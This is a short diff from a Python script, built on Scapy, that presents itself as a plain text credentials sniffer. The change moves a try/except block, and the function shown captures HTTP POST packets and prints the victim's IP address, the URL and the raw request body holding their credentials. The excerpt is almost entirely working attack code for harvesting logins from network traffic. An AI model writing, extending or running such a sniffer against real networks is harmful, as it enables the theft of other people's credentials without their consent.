@@ -6,14 +6,14 @@ from scapy.sendrecv import sniff
 
 
 def credentialsSniffing(packet):
-    if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
-        try:
+    try:
+        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
             url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
             ipVictim = packet[IP].src
             credentials = packet[Raw].load.decode("utf-8")
             print("[*] From: ", ipVictim, credentials, url)
-        except:
-            pass
+    except:
+        pass
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
